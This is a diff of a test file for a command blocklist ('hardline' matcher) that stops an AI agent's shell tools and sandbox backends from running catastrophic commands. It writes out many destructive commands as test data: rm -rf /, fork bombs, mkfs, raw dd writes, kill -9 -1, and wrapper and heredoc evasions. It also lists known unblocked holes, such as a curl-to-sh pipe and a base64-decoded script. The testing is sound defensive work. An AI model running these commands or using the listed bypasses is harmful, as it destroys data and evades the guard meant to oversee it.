@@ -6,6 +6,8 @@ import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { createBuiltinTools } from '../dist/tools/builtin-tools.js';
 import { SandboxManager } from '../dist/sandbox/os-sandbox.js';
+import { NativeAgentSandbox } from '../dist/sandbox/native-agent-sandbox.js';
+import { createAgentSandboxFromEnv } from '../dist/sandbox/create-agent-sandbox.js';
 import { RemoteVmAgentSandbox } from '../dist/sandbox/remote-vm-agent-sandbox.js';
 import { MicroserviceAgentSandbox } from '../dist/sandbox/microservice-agent-sandbox.js';
 import { startBackgroundJob } from '../dist/runtime/spawn-host.js';
@@ -83,6 +85,222 @@ describe('command hardline matcher', () => {
     assertAllowed('init');
   });
 
+  it('does not flag look-alike words, arguments, or benign neighbours', () => {
+    assertAllowed('echo "shutdown now"');
+    assertAllowed('grep reboot log');
+    assertAllowed('cat mkfs.txt');
+    assertAllowed('ls /tmp/mkfs.ext4');
+    assertAllowed('vim shutdown.sh');
+    assertAllowed('dd if=a of=b.img');
+    assertAllowed('systemctl status nginx');
+    assertAllowed('systemctl restart nginx');
+    assertAllowed('rm -rf /tmp/x');
+    assertAllowed('rm -rf ./build');
+    assertAllowed('rm -f /etc/hosts.bak');
+    assertAllowed('rm /');
+    assertAllowed('find /tmp -name "*.log" -delete');
+    assertAllowed('find / -name "*.tmp" -delete');
+    assertAllowed('find /home/agent/proj -type f -delete');
+    assertAllowed('echo "rm -rf /" > notes.txt');
+    assertAllowed('printf "reboot" | cat');
+    assertAllowed('cat <<EOF\nrm -rf /\nreboot\nEOF');
+    assertAllowed('echo "docs: rm -rf /" | sh');
+    assertAllowed('echo ok | bash script.sh');
+  });
+
+  it('kill: only pid -1 is refused, real signals to real pids are fine', () => {
+    assertAllowed('kill -1 1234');
+    assertAllowed('kill -1 1234 5678');
+    assertAllowed('kill -HUP 1234');
+    assertAllowed('kill -SIGHUP 1234');
+    assertAllowed('kill -s HUP 1234');
+    assertAllowed('kill -s 1 1234');
+    assertAllowed('kill -9 1234');
+    assertAllowed('kill -9 -1234');
+    assertAllowed('kill -l');
+    assertAllowed('kill -L');
+    assertAllowed('kill -TERM $(pgrep nginx)');
+    assertBlocked('kill -1', 'kill-minus-one');
+    assertBlocked('kill -1 -1', 'kill-minus-one');
+    assertBlocked('kill -9 -1', 'kill-minus-one');
+    assertBlocked('kill -KILL -1', 'kill-minus-one');
+    assertBlocked('kill -HUP -1', 'kill-minus-one');
+    assertBlocked('kill -s KILL -1', 'kill-minus-one');
+    assertBlocked('kill -s HUP -1', 'kill-minus-one');
+    assertBlocked('kill -n 9 -1', 'kill-minus-one');
+    assertBlocked('kill --signal KILL -1', 'kill-minus-one');
+    assertBlocked('kill -- -1', 'kill-minus-one');
+    assertBlocked('kill -9 1234 -1', 'kill-minus-one');
+    assertBlocked('sudo kill -9 -1', 'kill-minus-one');
+    assertBlocked('killall5', 'kill-minus-one');
+  });
+
+  it('sees through wrappers, compound commands, and command substitution', () => {
+    const wrapped = [
+      'env rm -rf /',
+      'env FOO=1 rm -rf /',
+      'env -i -u X rm -rf /',
+      'FOO=1 rm -rf /',
+      'sudo env rm -rf /',
+      'sudo -u root rm -rf /',
+      'doas rm -rf /',
+      'nice -n 5 rm -rf /',
+      'nohup rm -rf /',
+      'timeout 5 rm -rf /',
+      'timeout -s KILL 5 rm -rf /',
+      'exec rm -rf /',
+      'command rm -rf /',
+      'busybox rm -rf /',
+      'xargs -I{} rm -rf /',
+      'RM -rf /'
+    ];
+    for (const command of wrapped) assertBlocked(command, 'rm-root');
+
+    const compound = [
+      'true || rm -rf /',
+      'false && rm -rf /',
+      'echo a | rm -rf /',
+      'echo a; rm -rf /',
+      'echo a & rm -rf /',
+      'echo a\nrm -rf /',
+      'rm -rf / &',
+      '(rm -rf /)',
+      '{ rm -rf /; }',
+      'if true; then rm -rf /; fi',
+      'while true; do rm -rf /; done',
+      'until false; do rm -rf /; done',
+      'for i in 1 2; do rm -rf /; done',
+      '! rm -rf /',
+      'case x in x) rm -rf / ;; esac',
+      'f() { rm -rf /; }; f',
+      'echo $(rm -rf /)',
+      'echo `rm -rf /`',
+      'echo "$(rm -rf /)"',
+      'echo <(rm -rf /)',
+      'eval "rm -rf /"',
+      'sh -c "rm -rf /"',
+      'bash --norc -c "rm -rf /"',
+      'bash -o pipefail -c "rm -rf /"',
+      'sudo bash -c \'rm -rf /\'',
+      'bash -c "sh -c \'rm -rf /\'"',
+      'rm -rf \\\n/',
+      'rm -rf "/"',
+      "rm -rf '/'",
+      "r\\m -rf /",
+      '"rm" -rf /',
+      'rm -rf / --no-preserve-root',
+      'rm --no-preserve-root -rf /'
+    ];
+    for (const command of compound) assertBlocked(command, 'rm-root');
+    assertBlocked('for i in 1; do reboot; done', 'power');
+    assertBlocked('true && shutdown -h now', 'power');
+    assertBlocked('echo "$(mkfs.ext4 /dev/sdb)"', 'mkfs');
+  });
+
+  it('follows scripts fed to a shell through pipes, heredocs, and here-strings', () => {
+    assertBlocked('echo "rm -rf /" | sh', 'rm-root');
+    assertBlocked('echo "rm -rf /" | bash', 'rm-root');
+    assertBlocked('echo rm -rf / | sh', 'rm-root');
+    assertBlocked('printf "reboot" | sudo sh', 'power');
+    assertBlocked('echo "rm -rf /" | cat | bash', 'rm-root');
+    assertBlocked('echo hi |\n sh <<< "rm -rf /"', 'rm-root');
+    assertBlocked('sh <<< "rm -rf /"', 'rm-root');
+    assertBlocked('bash <<EOF\nrm -rf /\nEOF', 'rm-root');
+    assertBlocked("bash <<'EOF'\nrm -rf /\nEOF", 'rm-root');
+    assertBlocked('cat <<EOF | sh\nrm -rf /\nEOF', 'rm-root');
+    assertBlocked('cat <<EOF; rm -rf /\nhello\nEOF', 'rm-root');
+    assertBlocked('bash -s <<EOF\nshutdown now\nEOF', 'power');
+  });
+
+  it('covers rm variants on system dirs, home, and host home', () => {
+    assertBlocked('rm -Rf /', 'rm-root');
+    assertBlocked('rm -r -f /', 'rm-root');
+    assertBlocked('rm -f -R /', 'rm-root');
+    assertBlocked('rm -rf -v /', 'rm-root');
+    assertBlocked('rm -rf --one-file-system /', 'rm-root');
+    assertBlocked('rm -rf /.', 'rm-root');
+    assertBlocked('rm -rf //', 'rm-root');
+    assertBlocked('rm -rf /var', 'rm-system-dir');
+    assertBlocked('rm -rf /bin', 'rm-system-dir');
+    assertBlocked('rm -rf /boot', 'rm-system-dir');
+    assertBlocked('rm -rf /usr/bin', 'rm-system-dir');
+    assertBlocked('rm -rf /home/*', 'rm-system-dir');
+    assertBlocked('rm -rf /etc/*', 'rm-system-dir');
+    assertBlocked('rm -rf ~user', 'rm-home');
+    assertBlocked('rm -rf ~/.', 'rm-home');
+    assertBlocked('rm -rf $HOME/*', 'rm-home');
+    assertBlocked('rm -rf "$HOME/"*', 'rm-home');
+    assertBlocked('rm -rf $HOME/..', 'rm-home');
+    assertBlocked(`rm -rf ${process.env.HOME}`, 'rm-home');
+    assertAllowed(`rm -rf ${process.env.HOME}/project/dist`);
+    assertAllowed('rm -rf $HOME/.cache/foo');
+  });
+
+  it('covers find -delete, dd devices, mkfs variants, and power verbs', () => {
+    assertBlocked('find / -delete', 'rm-root');
+    assertBlocked('find / -depth -delete', 'rm-root');
+    assertBlocked('find / -exec rm -rf {} +', 'rm-root');
+    assertBlocked('find ~ -delete', 'rm-home');
+    assertBlocked('find /etc -delete', 'rm-system-dir');
+    assertBlocked('dd if=x of=/dev/sda1', 'dd-raw-device');
+    assertBlocked('dd of=/dev/sda if=/dev/zero', 'dd-raw-device');
+    assertBlocked('dd if=x of=/dev/disk0', 'dd-raw-device');
+    assertBlocked('dd if=x of=/dev/rdisk2', 'dd-raw-device');
+    assertBlocked('dd if=x of=/dev/loop0', 'dd-raw-device');
+    assertBlocked('dd if=x of=/dev/mapper/vg-root', 'dd-raw-device');
+    assertBlocked('dd if=x of=/dev/md0', 'dd-raw-device');
+    assertBlocked('mkfs -t ext4 /dev/sda', 'mkfs');
+    assertBlocked('mke2fs /dev/sda', 'mkfs');
+    assertBlocked('sudo mkfs.ext4 /dev/sda', 'mkfs');
+    assertBlocked('sudo shutdown now', 'power');
+    assertBlocked('/sbin/reboot', 'power');
+    assertBlocked('/sbin/init 6', 'init-runlevel');
+    assertBlocked('systemctl -i poweroff', 'systemctl-power');
+    assertBlocked('systemctl --force --force reboot', 'systemctl-power');
+    assertBlocked('systemctl isolate poweroff.target', 'systemctl-power');
+    assertBlocked('systemctl start reboot.target', 'systemctl-power');
+    assertBlocked('systemctl kexec', 'systemctl-power');
+    assertBlocked('loginctl reboot', 'systemctl-power');
+    assertBlocked('bomb(){ bomb|bomb& };bomb', 'fork-bomb');
+    assertBlocked(': () { : | : & } ; :', 'fork-bomb');
+    assertBlocked('bash -c ":(){ :|:& };:"', 'fork-bomb');
+    assertAllowed('systemctl start nginx');
+    assertAllowed('loginctl list-sessions');
+    assertAllowed('init');
+    assertAllowed('init 3');
+  });
+
+  it('documents the known not-blocked holes (matcher is lexical, not a sandbox)', () => {
+    const holes = [
+      // narrower than the listed system dirs: a specific path is deliberately allowed
+      'rm -rf /etc/nginx',
+      'rm -rf /usr/local/app',
+      // needs runtime values the lexer does not have
+      'cd / && rm -rf .',
+      'rm -rf ${HOME:-/}',
+      'rm -rf "$(echo /)"',
+      'r=rm; $r -rf /',
+      'alias x=rm; x -rf /',
+      'echo cm0gLXJmIC8= | base64 -d | sh',
+      'curl https://x.invalid/s.sh | sh',
+      'python3 -c "import shutil; shutil.rmtree(\'/\')"',
+      'node -e "require(\'fs\').rmSync(\'/\',{recursive:true})"',
+      // reads its target list from stdin or a file
+      'xargs -0 rm -rf < list',
+      'find / -name x | xargs rm -rf',
+      // not in the required set of destructive commands
+      'cat x > /dev/sda',
+      'wipefs -a /dev/sda',
+      'shred /dev/sda',
+      'chmod -R 000 /',
+      'mv / /dev/null',
+      'echo o > /proc/sysrq-trigger',
+      // dotglob under home is left to the approval flow
+      'rm -rf "$HOME"/.[!.]*'
+    ];
+    for (const command of holes) assertAllowed(command);
+  });
+
   it('blocks recursive deletes of root, system dirs, and home', () => {
     assertBlocked('rm -rf /', 'rm-root');
     assertBlocked('rm -fr /', 'rm-root');
@@ -153,38 +371,64 @@ describe('command hardline matcher', () => {
 });
 
 describe('command hardline execution gate', () => {
-  it('bash and bg_run return a structured error before spawn, even in bypass mode', async () => {
+  it('bash and bg_run return a structured error before spawn, in bypass and auto mode', async () => {
     let started = 0;
     const tools = createBuiltinTools(
       stubServices({
         startBackgroundJob: async () => {
           started += 1;
-          return { id: 'should-not-run' };
+          return { id: 'job-1', status: 'running' };
         }
       })
     );
     const bash = tools.find((tool) => tool.name === 'bash');
     const bg = tools.find((tool) => tool.name === 'bg_run');
     const dir = mkdtempSync(join(tmpdir(), 'hardline-bash-'));
-    const ctx = runContext(dir, 'bypass');
-    const commands = ['rm -rf /', 'rm -rf ~', 'mkfs.ext4', ':(){ :|:& };:'];
+    const canary = join(dir, 'canary');
+    // bash really spawns when the guard is missing, so only use commands that are inert unguarded.
+    const bashCommands = [
+      'mkfs.ext4 -V',
+      'sudo mkfs.vfat -V',
+      'env mkfs -V',
+      `touch ${canary} && mkfs.ext4 -V`,
+      'echo x | sh -c "mkfs.ext4 -V"'
+    ];
+    // bg_run is stubbed here, so the full catastrophic set is safe to feed it.
+    const bgCommands = [
+      ...bashCommands,
+      'rm -rf /',
+      'sudo rm -rf ~',
+      ':(){ :|:& };:',
+      'kill -9 -1',
+      'systemctl poweroff',
+      'shutdown -h now'
+    ];
 
-    for (const command of commands) {
-      assert.ok(matchCommandHardline(command), command);
-      const result = await bash.execute(ctx, { command });
-      assert.equal(result.ok, false, command);
-      const payload = JSON.parse(result.content);
-      assert.equal(payload.error_code, HARDLINE_ERROR_CODE);
-      assert.equal(result.metadata.hardline, true);
-      assert.equal(result.metadata.ruleId, payload.rule_id);
+    for (const mode of ['bypass', 'auto']) {
+      const ctx = runContext(dir, mode);
+      for (const [name, tool, commands] of [
+        ['bash', bash, bashCommands],
+        ['bg_run', bg, bgCommands]
+      ]) {
+        for (const command of commands) {
+          const expected = matchCommandHardline(command);
+          assert.ok(expected, command);
+          const result = await tool.execute(ctx, { command });
+          assert.equal(result.ok, false, `${name}/${mode}: ${command}`);
+          const payload = JSON.parse(result.content);
+          assert.equal(payload.error_code, HARDLINE_ERROR_CODE);
+          assert.equal(payload.rule_id, expected.ruleId);
+          assert.equal(result.metadata.hardline, true);
+          assert.equal(result.metadata.ruleId, expected.ruleId);
+        }
+      }
     }
+    assert.equal(started, 0, 'bg_run must not create a job for a blocked command');
+    assert.equal(existsSync(canary), false, 'bash must not have spawned');
 
-    const autoCtx = runContext(dir, 'auto');
-    assert.ok(matchCommandHardline('rm -rf /'));
-    const bgResult = await bg.execute(autoCtx, { command: 'rm -rf /' });
-    assert.equal(bgResult.ok, false);
-    assert.equal(JSON.parse(bgResult.content).error_code, HARDLINE_ERROR_CODE);
-    assert.equal(started, 0);
+    const okJob = await bg.execute(runContext(dir, 'bypass'), { command: 'echo fine' });
+    assert.equal(okJob.ok, true);
+    assert.equal(started, 1, 'control: benign bg_run still starts a job');
   });
 
   it('still runs ordinary rm and echo', async () => {
@@ -223,15 +467,97 @@ describe('command hardline execution gate', () => {
     );
   });
 
-  it('SandboxManager refuses mkfs before provider spawn', async () => {
-    assert.ok(matchCommandHardline('mkfs.ext4'));
-    const mgr = new SandboxManager('direct');
-    const result = await mgr.execute('mkfs.ext4', tmpdir());
-    assert.equal(result.code, 126);
-    assert.equal(result.tier, 0);
-    const payload = JSON.parse(result.stderr);
-    assert.equal(payload.error_code, HARDLINE_ERROR_CODE);
-    assert.equal(payload.rule_id, 'mkfs');
+  it('SandboxManager refuses before spawn in direct, os, and auto modes', async () => {
+    for (const mode of ['direct', 'os', 'auto', 'container']) {
+      const dir = mkdtempSync(join(tmpdir(), `hardline-mgr-${mode}-`));
+      const canary = join(dir, 'canary');
+      const command = `touch ${canary} && mkfs.ext4`;
+      assert.equal(matchCommandHardline(command)?.ruleId, 'mkfs', mode);
+      const mgr = new SandboxManager(mode);
+      const result = await mgr.execute(command, dir);
+      assert.equal(result.code, 126, mode);
+      assert.equal(result.tier, 0, mode);
+      assert.equal(existsSync(canary), false, `${mode}: command must not have spawned`);
+      const payload = JSON.parse(result.stderr);
+      assert.equal(payload.error_code, HARDLINE_ERROR_CODE);
+      assert.equal(payload.rule_id, 'mkfs');
+    }
+  });
+
+  it('SandboxManager still runs benign commands (guard is not a blanket refusal)', async () => {
+    const dir = mkdtempSync(join(tmpdir(), 'hardline-mgr-ok-'));
+    const result = await new SandboxManager('direct').execute('echo hardline-ok', dir);
+    assert.equal(result.code, 0);
+    assert.match(result.stdout, /hardline-ok/);
+  });
+
+  it('cloudflare-computer backend never sends a hardline command over the wire', async () => {
+    const hits = [];
+    const server = createServer((req, res) => {
+      hits.push(req.url ?? '');
+      res.writeHead(200, { 'content-type': 'application/json' });
+      res.end(JSON.stringify({ exitCode: 0, stdout: 'ran', stderr: '' }));
+    });
+    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+    const address = server.address();
+    assert.ok(address && typeof address === 'object');
+    const previous = process.env.CLOUDFLARE_COMPUTER_ENDPOINT;
+    process.env.CLOUDFLARE_COMPUTER_ENDPOINT = `http://127.0.0.1:${address.port}`;
+    try {
+      const mgr = new SandboxManager('cloudflare-computer');
+      assert.equal(mgr.activeProvider.name, 'cloudflare-computer');
+      const denied = await mgr.execute('sudo mkfs.ext4 -V', tmpdir(), { sessionId: 'hardline-cf' });
+      assert.equal(denied.code, 126);
+      assert.equal(JSON.parse(denied.stderr).rule_id, 'mkfs');
+      assert.equal(hits.length, 0, 'blocked command must not reach the worker');
+
+      const ok = await mgr.execute('echo hi', tmpdir(), { sessionId: 'hardline-cf' });
+      assert.equal(ok.stdout, 'ran');
+      assert.equal(hits.length, 1, 'control: benign command does reach the worker');
+    } finally {
+      if (previous === undefined) delete process.env.CLOUDFLARE_COMPUTER_ENDPOINT;
+      else process.env.CLOUDFLARE_COMPUTER_ENDPOINT = previous;
+      await new Promise((resolve, reject) => server.close((err) => (err ? reject(err) : resolve())));
+    }
+  });
+
+  it('NativeAgentSandbox and env-created sandboxes refuse with kind and backend set', async () => {
+    const native = new NativeAgentSandbox(() => 'direct');
+    const nativeDenied = await native.execute({
+      command: 'mkfs.ext4 -V',
+      cwd: tmpdir(),
+      workspace: tmpdir(),
+      timeoutMs: 2000
+    });
+    assert.equal(nativeDenied.code, 126);
+    assert.equal(nativeDenied.kind, 'native');
+    assert.equal(nativeDenied.backend, 'command-hardline');
+    assert.equal(JSON.parse(nativeDenied.stderr).rule_id, 'mkfs');
+
+    for (const kind of ['native', 'remote_vm', 'microservice']) {
+      const sandbox = createAgentSandboxFromEnv({ RAW_AGENT_AGENT_SANDBOX_KIND: kind });
+      const denied = await sandbox.execute({
+        command: 'mkfs.ext4 -V',
+        cwd: tmpdir(),
+        workspace: tmpdir(),
+        timeoutMs: 2000
+      });
+      assert.equal(denied.code, 126, kind);
+      assert.equal(denied.kind, kind);
+      assert.equal(denied.backend, 'command-hardline');
+    }
+  });
+
+  it('work_evidence verify_command cannot smuggle a hardline command', async () => {
+    const tools = createBuiltinTools(stubServices());
+    const tool = tools.find((t) => t.name === 'work_evidence');
+    const dir = mkdtempSync(join(tmpdir(), 'hardline-evidence-'));
+    const result = await tool.execute(runContext(dir, 'bypass'), { verify_command: 'sudo mkfs.ext4 -V' });
+    assert.equal(result.ok, false);
+    const payload = JSON.parse(String(result.content).trim());
+    assert.equal(payload.verify.exit_code, 126);
+    assert.equal(payload.verify.sandbox_backend, 'command-hardline');
+    assert.equal(JSON.parse(payload.verify.stderr_clip).error_code, HARDLINE_ERROR_CODE);
   });
 
   it('remote VM and microservice backends cannot skip the hardline', async () => {
@@ -262,8 +588,13 @@ describe('command hardline execution gate', () => {
         timeoutMs: 2000
       });
       assert.equal(remoteDenied.code, 126);
+      assert.equal(remoteDenied.kind, 'remote_vm');
       assert.equal(remoteDenied.backend, 'command-hardline');
+      assert.equal(JSON.parse(remoteDenied.stderr).rule_id, 'rm-root');
+      assert.equal(microDenied.code, 126);
+      assert.equal(microDenied.kind, 'microservice');
       assert.equal(microDenied.backend, 'command-hardline');
+      assert.equal(JSON.parse(microDenied.stderr).rule_id, 'mkfs');
       assert.equal(hits.length, 0);
 
       const remoteOk = await remote.execute({
@@ -273,7 +604,14 @@ describe('command hardline execution gate', () => {
         timeoutMs: 2000
       });
       assert.equal(remoteOk.stdout, 'ran');
-      assert.deepEqual(hits, ['/exec']);
+      const microOk = await micro.execute({
+        command: 'echo hi',
+        cwd: '/tmp',
+        workspace: '/tmp',
+        timeoutMs: 2000
+      });
+      assert.equal(microOk.stdout, 'ran');
+      assert.equal(hits.length, 2, 'control: benign commands reach both backends');
     } finally {
       await new Promise((resolve, reject) => server.close((err) => (err ? reject(err) : resolve())));
     }
